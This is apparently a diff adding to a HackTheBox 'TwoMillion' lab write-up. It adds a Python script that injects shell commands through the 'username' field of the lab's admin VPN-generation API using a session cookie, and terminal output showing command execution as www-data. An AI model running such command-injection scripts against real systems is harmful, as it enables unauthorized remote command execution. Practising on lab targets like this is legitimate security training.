@@ -623,8 +623,36 @@ bfd36c19a809981c06a91882b6800549
 
 ```
 
+``` python3
 
+import requests
 
+url = "http://2million.htb/api/v1/admin/vpn/generate"
+
+session = requests.Session()
+session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
+
+try:
+    comando = input("")
+    r = session.post(url, json={"username":f";{comando};"})
+    print(r.status_code)
+    print(r.text)
+except Exception as e:
+    print(f"Error:{e}")
+
+```
+
+``` bash
+
+❯ python3 injection.py
+id
+200
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
 
 
 
